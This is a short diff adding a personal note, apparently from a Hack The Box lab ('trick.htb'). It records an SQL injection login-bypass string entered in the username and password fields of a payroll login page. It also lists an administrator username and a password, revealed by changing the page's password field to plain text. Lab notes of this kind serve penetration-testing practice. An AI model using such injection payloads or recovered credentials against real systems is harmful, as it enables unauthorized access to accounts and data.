@@ -1,0 +1,8 @@
+Using : admin' or true-- -
+in user and pswd
+get acces to the http://preprod-payroll.trick.htb/login.php
+
+In the main page:
+Name: Administrator
+Username: Enemigosss
+passwd: blazo [obteined by modifing the html code source in passwd by text]
